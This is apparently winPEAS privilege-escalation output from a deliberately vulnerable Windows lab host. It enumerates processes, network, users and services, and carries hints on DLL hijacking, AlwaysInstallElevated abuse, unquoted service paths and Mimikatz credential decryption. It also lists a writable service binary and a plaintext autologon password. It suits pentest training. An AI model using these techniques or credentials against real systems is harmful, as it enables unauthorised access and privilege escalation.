+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
+
+Image Name                     PID Services
+========================= ======== ============================================
+System Idle Process              0 N/A
+System                           4 N/A
+smss.exe                       196 N/A
+csrss.exe                      276 N/A
+csrss.exe                      344 N/A
+wininit.exe                    352 N/A
+winlogon.exe                   380 N/A
+services.exe                   444 N/A
+lsass.exe                      452 SamSs, VaultSvc
+svchost.exe                    508 BrokerInfrastructure, DcomLaunch, LSM,
+                                   PlugPlay, Power, SystemEventsBroker
+svchost.exe                    536 RpcEptMapper, RpcSs
+dwm.exe                        644 N/A
+svchost.exe                    676 Dhcp, EventLog, lmhosts, Wcmsvc
+svchost.exe                    720 AeLookupSvc, CertPropSvc, gpsvc, IKEEXT,
+                                   iphlpsvc, LanmanServer, ProfSvc, Schedule,
+                                   SENS, SessionEnv, ShellHWDetection, Themes,
+                                   Winmgmt
+svchost.exe                    784 EventSystem, FontCache, netprofm, nsi,
+                                   WinHttpAutoProxySvc
+svchost.exe                    864 CryptSvc, Dnscache, LanmanWorkstation,
+                                   NlaSvc, WinRM
+svchost.exe                    992 BFE, DPS, MpsSvc
+spoolsv.exe                    436 Spooler
+httpd.exe                      532 jenkinsApache
+winserv.exe                    964 jenkinsGradle
+tomcat8.exe                    292 jenkinsTomcat
+cmd.exe                       1028 N/A
+conhost.exe                   1036 N/A
+conhost.exe                   1044 N/A
+svchost.exe                   1088 TrkWks, UALSVC, UmRdpService
+java.exe                      1104 N/A
+httpd.exe                     1140 N/A
+svchost.exe                   1828 TermService
+svchost.exe                   1856 PolicyAgent
+taskhostex.exe                2360 N/A
+explorer.exe                  2396 N/A
+iexplore.exe                  2908 N/A
+iexplore.exe                  2960 N/A
+iexplore.exe                  2404 N/A
+msdtc.exe                     2784 MSDTC
+RuntimeBroker.exe              972 N/A
+powershell.exe                 752 N/A
+conhost.exe                   3396 N/A
+powershell.exe                3476 N/A
+notepad.exe                    908 N/A
+cmd.exe                        728 N/A
+WmiPrvSE.exe                  3600 N/A
+WmiPrvSE.exe                  3680 N/A
+TrustedInstaller.exe          3452 TrustedInstaller
+TiWorker.exe                  3340 N/A
+tasklist.exe                  3472 N/A
+
+   [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when
+Administrator logs in)
+C:\Windows\Explorer.EXE NT SERVICE\TrustedInstaller:(F)
+
+C:\Program Files\Internet Explorer\iexplore.exe NT SERVICE\TrustedInstaller:(F)
+
+C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE NT SERVICE\TrustedInstaller:(F)
+
+C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE NT SERVICE\TrustedInstaller:(F)
+
+
+   [i] Checking directory permissions of running processes (DLL injection)
+C:\Windows\ NT SERVICE\TrustedInstaller:(F)
+
+C:\Program Files\Internet Explorer\ NT SERVICE\TrustedInstaller:(F)
+
+C:\Program Files (x86)\Internet Explorer\ NT SERVICE\TrustedInstaller:(F)
+
+C:\Program Files (x86)\Internet Explorer\ NT SERVICE\TrustedInstaller:(F)
+
+
+ ?[33m[+]?[97m RUN AT STARTUP
+   [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found bi
+nary
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
+C:\Documents and Settings\All Users\Start Menu\Programs\Startup BUILTIN\Users:(F)
+
+C:\Documents and Settings\All Users\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)
+
+C:\Documents and Settings\backup\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                                             WIN-EVAGJ1T16QD\backup:(OI)(CI)(F)
+
+C:\Documents and Settings\backup\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(F)
+                                                                         WIN-EVAGJ1T16QD\backup:(F)
+
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
+
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)
+
+C:\Users\backup\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                                                              WIN-EVAGJ1T16QD\backup:(OI)(CI)(F)
+
+C:\Users\backup\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(F)
+                                                                                          WIN-EVAGJ1T16QD\backup:(F)
+
+Folder: \
+
+Folder: \Microsoft
+INFO: There are no scheduled tasks presently available at your access level.
+
+Folder: \Microsoft\Windows
+INFO: There are no scheduled tasks presently available at your access level.
+
+Folder: \Microsoft\Windows\.NET Framework
+.NET Framework NGEN v4.0.30319           N/A                    Ready
+.NET Framework NGEN v4.0.30319 64        N/A                    Ready
+
+Folder: \Microsoft\Windows\Active Directory Rights Management Services Client
+AD RMS Rights Policy Template Management N/A                    Ready
+
+Folder: \Microsoft\Windows\AppID
+SmartScreenSpecific                      N/A                    Ready
+
+Folder: \Microsoft\Windows\Application Experience
+ProgramDataUpdater                       N/A                    Ready
+
+Folder: \Microsoft\Windows\Autochk
+Proxy                                    N/A                    Ready
+
+Folder: \Microsoft\Windows\CertificateServicesClient
+UserTask                                 N/A                    Ready
+
+Folder: \Microsoft\Windows\Chkdsk
+ProactiveScan                            N/A                    Ready
+
+Folder: \Microsoft\Windows\Customer Experience Improvement Program
+Consolidator                             8/14/2021 4:00:00 PM   Ready
+KernelCeipTask                           N/A                    Ready
+UsbCeip                                  N/A                    Ready
+
+Folder: \Microsoft\Windows\Data Integrity Scan
+Data Integrity Scan                      8/29/2021 5:39:18 AM   Ready
+Data Integrity Scan for Crash Recovery   N/A                    Ready
+
+Folder: \Microsoft\Windows\Defrag
+ScheduledDefrag                          N/A                    Ready
+
+Folder: \Microsoft\Windows\Device Setup
+Metadata Refresh                         N/A                    Ready
+
+Folder: \Microsoft\Windows\IME
+
+Folder: \Microsoft\Windows\MemoryDiagnostic
+
+Folder: \Microsoft\Windows\MUI
+LPRemove                                 N/A                    Ready
+
+Folder: \Microsoft\Windows\Multimedia
+
+Folder: \Microsoft\Windows\NetCfg
+BindingWorkItemQueueHandler              N/A                    Ready
+
+Folder: \Microsoft\Windows\NetTrace
+GatherNetworkInfo                        N/A                    Ready
+
+Folder: \Microsoft\Windows\PLA
+INFO: There are no scheduled tasks presently available at your access level.
+
+Folder: \Microsoft\Windows\Plug and Play
+Device Install Reboot Required           N/A                    Ready
+
+Folder: \Microsoft\Windows\Power Efficiency Diagnostics
+AnalyzeSystem                            N/A                    Ready
+
+Folder: \Microsoft\Windows\RAC
+
+Folder: \Microsoft\Windows\Registry
+RegIdleBackup                            N/A                    Ready
+
+Folder: \Microsoft\Windows\Server Manager
+CleanupOldPerfLogs                       N/A                    Ready
+ServerManager                            N/A                    Ready
+
+Folder: \Microsoft\Windows\Servicing
+StartComponentCleanup                    N/A                    Ready
+
+Folder: \Microsoft\Windows\Shell
+CreateObjectTask                         N/A                    Ready
+
+Folder: \Microsoft\Windows\Software Inventory Logging
+
+Folder: \Microsoft\Windows\SoftwareProtectionPlatform
+
+Folder: \Microsoft\Windows\Storage Tiers Management
+Storage Tiers Management Initialization  N/A                    Ready
+
+Folder: \Microsoft\Windows\Task Manager
+Interactive                              N/A                    Ready
+
+Folder: \Microsoft\Windows\TaskScheduler
+Manual Maintenance                       N/A                    Ready
+Regular Maintenance                      8/15/2021 4:39:50 AM   Ready
+
+Folder: \Microsoft\Windows\TextServicesFramework
+MsCtfMonitor                             N/A                    Running
+
+Folder: \Microsoft\Windows\Time Synchronization
+SynchronizeTime                          N/A                    Ready
+
+Folder: \Microsoft\Windows\Time Zone
+SynchronizeTimeZone                      N/A                    Ready
+
+Folder: \Microsoft\Windows\WDI
+ResolutionHost                           N/A                    Ready
+
+Folder: \Microsoft\Windows\Windows Error Reporting
+QueueReporting                           N/A                    Ready
+
+Folder: \Microsoft\Windows\Windows Filtering Platform
+BfeOnServiceStartTypeChange              N/A                    Ready
+
+Folder: \Microsoft\Windows\WindowsColorSystem
+
+Folder: \Microsoft\Windows\WindowsUpdate
+Scheduled Start                          N/A                    Ready
+
+Folder: \Microsoft\Windows\Wininet
+CacheTask                                N/A                    Running
+
+Folder: \Microsoft\Windows\Workplace Join
+
+Folder: \Microsoft\Windows\WS
+WSTask                                   N/A                    Ready
+
+ ?[33m[+]?[97m AlwaysInstallElevated?
+   [i] If '1' then you can install a .msi file with admin privileges ;)
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+
+?[32m[*]?[97m NETWORK
+ ?[33m[+]?[97m CURRENT SHARES
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share
+IPC$                                         Remote IPC
+ADMIN$       C:\Windows                      Remote Admin
+The command completed successfully.
+
+
+ ?[33m[+]?[97m INTERFACES
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : WIN-EVAGJ1T16QD
+   Primary Dns Suffix  . . . . . . . :
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter
+   Physical Address. . . . . . . . . : 08-00-27-CC-ED-6B
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : 2a01:e34:ec6f:d7e0:55d7:c826:4294:b8ed(Preferred)
+   Link-local IPv6 Address . . . . . : fe80::55d7:c826:4294:b8ed%12(Preferred)
+   IPv4 Address. . . . . . . . . . . : 192.168.1.50(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Lease Obtained. . . . . . . . . . : Wednesday, July 8, 1885 12:52:42 PM
+   Lease Expires . . . . . . . . . . : Saturday, August 14, 2021 10:21:08 PM
+   Default Gateway . . . . . . . . . : fe80::6aa3:78ff:fe8b:cdd%12
+                                       192.168.1.254
+   DHCP Server . . . . . . . . . . . : 192.168.1.254
+   DHCPv6 IAID . . . . . . . . . . . : 302514215
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-22-B1-62-A2-08-00-27-CC-ED-6B
+   DNS Servers . . . . . . . . . . . : 192.168.1.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Tunnel adapter isatap.{90148F03-D3ED-497A-A8AA-707E40A59758}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+ ?[33m[+]?[97m USED PORTS
+   [i] Check for services restricted from the outside
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       532
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       532
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1828
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8009           0.0.0.0:0              LISTENING       292
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       352
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       720
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       436
+  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       444
+  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       1856
+  TCP    0.0.0.0:49159          0.0.0.0:0              LISTENING       1104
+  TCP    0.0.0.0:49160          0.0.0.0:0              LISTENING       452
+  TCP    127.0.0.1:8005         0.0.0.0:0              LISTENING       292
+  TCP    192.168.1.50:139       0.0.0.0:0              LISTENING       4
+  TCP    [::]:80                [::]:0                 LISTENING       532
+  TCP    [::]:135               [::]:0                 LISTENING       536
+  TCP    [::]:443               [::]:0                 LISTENING       532
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:3389              [::]:0                 LISTENING       1828
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       352
+  TCP    [::]:49153             [::]:0                 LISTENING       676
+  TCP    [::]:49154             [::]:0                 LISTENING       720
+  TCP    [::]:49155             [::]:0                 LISTENING       436
+  TCP    [::]:49157             [::]:0                 LISTENING       444
+  TCP    [::]:49158             [::]:0                 LISTENING       1856
+  TCP    [::]:49159             [::]:0                 LISTENING       1104
+  TCP    [::]:49160             [::]:0                 LISTENING       452
+
+ ?[33m[+]?[97m FIREWALL
+
+Firewall status:
+-------------------------------------------------------------------
+Profile                           = Standard
+Operational mode                  = Disable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+Group policy version              = Windows Firewall
+Remote admin mode                 = Disable
+
+Ports currently open on all network interfaces:
+Port   Protocol  Version  Program
+-------------------------------------------------------------------
+No ports are currently open on all network interfaces.
+
+IMPORTANT: Command executed successfully.
+However, "netsh firewall" is deprecated; use "netsh advfirewall firewall" instead.
+For more information on using "netsh advfirewall firewall" commands instead of "netsh firewall", see KB article 947709 at http://go.microsoft.com/fwlink/?linkid=121488 .
+
+
+Domain profile configuration:
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+
+Service configuration for Domain profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          Remote Desktop
+
+Allowed programs configuration for Domain profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+Disable  Inbound              Bitnami Jenkins Stack Manager Tool / C:\Bitnami\jenkins-2.121.1-0\manager-windows.exe
+
+Port configuration for Domain profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+
+ICMP configuration for Domain profile:
+Mode     Type  Description
+-------------------------------------------------------------------
+Enable   2     Allow outbound packet too big
+
+Standard profile configuration (current):
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Disable
+
+Service configuration for Standard profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          File and Printer Sharing
+Enable   No          Remote Desktop
+
+Allowed programs configuration for Standard profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+Enable   Inbound              Bitnami Jenkins Stack Manager Tool / C:\Bitnami\jenkins-2.121.1-0\manager-windows.exe
+
+Port configuration for Standard profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+
+ICMP configuration for Standard profile:
+Mode     Type  Description
+-------------------------------------------------------------------
+Enable   2     Allow outbound packet too big
+Enable   8     Allow inbound echo request
+
+Log configuration:
+-------------------------------------------------------------------
+File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
+Max file size   = 4096 KB
+Dropped packets = Disable
+Connections     = Disable
+
+IMPORTANT: Command executed successfully.
+However, "netsh firewall" is deprecated;
+use "netsh advfirewall firewall" instead.
+For more information on using "netsh advfirewall firewall" commands
+instead of "netsh firewall", see KB article 947709
+at http://go.microsoft.com/fwlink/?linkid=121488 .
+
+
+ ?[33m[+]?[97m ARP
+
+Interface: 192.168.1.50 --- 0xc
+  Internet Address      Physical Address      Type
+  192.168.1.254         68-a3-78-8b-0c-dd     dynamic
+  192.168.1.255         ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.77.124.213        01-00-5e-4d-7c-d5     static
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static
+
+ ?[33m[+]?[97m ROUTES
+===========================================================================
+Interface List
+ 12...08 00 27 cc ed 6b ......Intel(R) PRO/1000 MT Desktop Adapter
+  1...........................Software Loopback Interface 1
+ 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
+===========================================================================
+
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0    192.168.1.254     192.168.1.50     10
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
+      192.168.1.0    255.255.255.0         On-link      192.168.1.50    266
+     192.168.1.50  255.255.255.255         On-link      192.168.1.50    266
+    192.168.1.255  255.255.255.255         On-link      192.168.1.50    266
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
+        224.0.0.0        240.0.0.0         On-link      192.168.1.50    266
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
+  255.255.255.255  255.255.255.255         On-link      192.168.1.50    266
+===========================================================================
+Persistent Routes:
+  None
+
+IPv6 Route Table
+===========================================================================
+Active Routes:
+ If Metric Network Destination      Gateway
+ 12    266 ::/0                     fe80::6aa3:78ff:fe8b:cdd
+  1    306 ::1/128                  On-link
+ 12    266 2a01:e34:ec6f:d7e0::/64  On-link
+ 12    266 2a01:e34:ec6f:d7e0:55d7:c826:4294:b8ed/128
+                                    On-link
+ 12    266 fe80::/64                On-link
+ 12    266 fe80::55d7:c826:4294:b8ed/128
+                                    On-link
+  1    306 ff00::/8                 On-link
+ 12    266 ff00::/8                 On-link
+===========================================================================
+Persistent Routes:
+  None
+
+ ?[33m[+]?[97m Hosts file
+
+ ?[33m[+]?[97m DNS CACHE
+    Record Name . . . . . : user-images.githubusercontent.com
+    Record Name . . . . . : user-images.githubusercontent.com
+    Record Name . . . . . : user-images.githubusercontent.com
+    Record Name . . . . . : user-images.githubusercontent.com
+    Record Name . . . . . : user-images.githubusercontent.com
+    A (Host) Record . . . : 185.199.109.133
+    Record Name . . . . . : user-images.githubusercontent.com
+    A (Host) Record . . . : 185.199.110.133
+    Record Name . . . . . : user-images.githubusercontent.com
+    A (Host) Record . . . : 185.199.111.133
+    Record Name . . . . . : user-images.githubusercontent.com
+    A (Host) Record . . . : 185.199.108.133
+    Record Name . . . . . : ocsp.digicert.com
+    Record Name . . . . . : avatars.githubusercontent.com
+    A (Host) Record . . . : 185.199.108.133
+    Record Name . . . . . : avatars.githubusercontent.com
+    A (Host) Record . . . : 185.199.109.133
+    Record Name . . . . . : avatars.githubusercontent.com
+    A (Host) Record . . . : 185.199.110.133
+    Record Name . . . . . : avatars.githubusercontent.com
+    A (Host) Record . . . : 185.199.111.133
+    Record Name . . . . . : github.githubassets.com
+    A (Host) Record . . . : 185.199.109.154
+    Record Name . . . . . : github.githubassets.com
+    A (Host) Record . . . : 185.199.110.154
+    Record Name . . . . . : github.githubassets.com
+    A (Host) Record . . . : 185.199.111.154
+    Record Name . . . . . : github.githubassets.com
+    A (Host) Record . . . : 185.199.108.154
+
+ ?[33m[+]?[97m WIFI
+?[32m[*]?[97m BASIC USER INFO
+   [i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate pri
+vileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, Se
+CreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
+
+ ?[33m[+]?[97m CURRENT USER
+User name                    backup
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            8/8/2021 8:28:42 PM
+Password expires             9/19/2021 8:28:42 PM
+Password changeable          8/8/2021 8:28:42 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   8/14/2021 7:21:45 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Backup Operators     *Remote Desktop Users
+                             *Users
+Global Group memberships     *None
+The command completed successfully.
+
+The request will be processed at a domain controller for domain WORKGROUP.
+
+
+USER INFORMATION
+----------------
+
+User Name              SID
+====================== =============================================
+win-evagj1t16qd\backup S-1-5-21-3698357007-189532211-3203426890-1008
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes
+====================================== ================ ============ ==================================================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
+BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+ ?[33m[+]?[97m USERS
+
+User accounts for \\WIN-EVAGJ1T16QD
+
+-------------------------------------------------------------------------------
+Administrator            backup                   Guest
+user
+The command completed successfully.
+
+
+ ?[33m[+]?[97m GROUPS
+
+Aliases for \\WIN-EVAGJ1T16QD
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Administrators
+*Backup Operators
+*Certificate Service DCOM Access
+*Cryptographic Operators
+*Distributed COM Users
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Power Users
+*Print Operators
+*RDS Endpoint Servers
+*RDS Management Servers
+*RDS Remote Access Servers
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*Users
+*WinRMRemoteWMIUsers__
+The command completed successfully.
+
+
+ ?[33m[+]?[97m ADMINISTRATORS GROUPS
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+-------------------------------------------------------------------------------
+Administrator
+The command completed successfully.
+
+
+ ?[33m[+]?[97m CURRENT LOGGED USERS
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>backup                console             1  Active      none   8/14/2021 7:21 PM
+
+ ?[33m[+]?[97m Kerberos Tickets
+
+Current LogonId is 0:0x4e997
+
+Cached Tickets: (0)
+
+ ?[33m[+]?[97m CURRENT CLIPBOARD
+   [i] Any password inside the clipboard?
+
+?[32m[*]?[97m SERVICE VULNERABILITIES
+
+ ?[33m[+]?[97m SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+   
+C:\Program Files\Clapplication\clservice.exe NT AUTHORITY\SYSTEM:(I)(F)
+C:\Program Files\Ckapplication\ckservice.exe NT AUTHORITY\SYSTEM:(I)(F)
+C:\Program Files\File Application Service\fileservice.exe Everyone:(F)
+C:\Bitnami\JENKIN~1.1-0\apache2\bin\httpd.exe NT AUTHORITY\SYSTEM:(I)(F)
+C:\Bitnami\JENKIN~1.1-0\gradle\scripts\winserv.exe NT AUTHORITY\SYSTEM:(I)(F)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)
+C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)
+C:\Program Files\Secure App Service\ryservice.exe NT AUTHORITY\SYSTEM:(I)(F)
+C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
+C:\Program Files\TH Application Service\Common Files\thservice.exe NT AUTHORITY\SYSTEM:(I)(F)
+
+ ?[33m[+]?[97m CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+
+ ?[33m[+]?[97m UNQUOTED SERVICE PATHS
+   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:
+\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to crea
+te 'C:\Program Files\soft\new.exe'
+   [i] The permissions are also checked and filtered using icacls
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+   
+jenkinsTomcat
+ C:\Bitnami\JENKIN~1.1-0\APACHE~1\bin\tomcat8.exe //RS//jenkinsTomcat
+Invalid parameter "//RS//jenkinsTomcat"
+
+NetTcpPortSharing
+ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)
+
+PerfHost
+ C:\Windows\SysWow64\perfhost.exe
+C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)
+
+TrustedInstaller
+ C:\Windows\servicing\TrustedInstaller.exe
+C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
+
+unquosvc
+ C:\Program Files\TH Application Service\Common Files\thservice.exe
+Invalid parameter "Files\TH"
+
+?[32m[*]?[97m DLL HIJACKING in PATHenv variable
+   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations
+   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+   
+C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)
+C:\Windows NT SERVICE\TrustedInstaller:(F)
+C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)
+C:\Temp NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+C:\Temp NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+
+
+?[32m[*]?[97m CREDENTIALS
+
+ ?[33m[+]?[97m WINDOWS VAULT
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault
+
+Currently stored credentials:
+* NONE *
+
+ ?[33m[+]?[97m DPAPI MASTER KEYS
+   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+
+
+    Directory: C:\Users\backup\AppData\Roaming\Microsoft\Protect
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d---s          8/8/2021   8:32 PM            S-1-5-21-3698357007-189532211-3203426890-1008
+
+
+ ?[33m[+]?[97m DPAPI MASTER KEYS
+   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt
+   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+
+Looking inside C:\Users\backup\AppData\Roaming\Microsoft\Credentials\
+
+Looking inside C:\Users\backup\AppData\Local\Microsoft\Credentials\
+
+ ?[33m[+]?[97m Unattended files
+C:\Windows\Panther\Unattend.xml exists.
+
+ ?[33m[+]?[97m SAM and SYSTEM backups
+
+ ?[33m[+]?[97m McAffee SiteList.xml
+ Volume in drive C has no label.
+ Volume Serial Number is C022-C9A0
+ Volume in drive C has no label.
+ Volume Serial Number is C022-C9A0
+ Volume in drive C has no label.
+ Volume Serial Number is C022-C9A0
+ Volume in drive C has no label.
+ Volume Serial Number is C022-C9A0
+
+ Directory of C:\Users\All Users\McAfee\Common Framework
+
+03/12/2020  03:51 AM             3,257 SiteList.xml
+               1 File(s)          3,257 bytes
+
+     Total Files Listed:
+               1 File(s)          3,257 bytes
+               0 Dir(s)  22,102,315,008 bytes free
+
+ ?[33m[+]?[97m GPP Password
+
+ ?[33m[+]?[97m Cloud Credentials
+
+ ?[33m[+]?[97m AppCmd
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
+
+ ?[33m[+]?[97m Files in registry that may contain credentials
+   [i] Searching specific files that may contains credentials.
+   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+Looking inside HKCU\Software\ORL\WinVNC3\Password
+Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
+Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
+    LastUsedUsername    REG_SZ    user
+    DefaultUsername    REG_SZ    user
+    DefaultPassword    REG_SZ    password321
+Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
+Looking inside HKCU\Software\TightVNC\Server
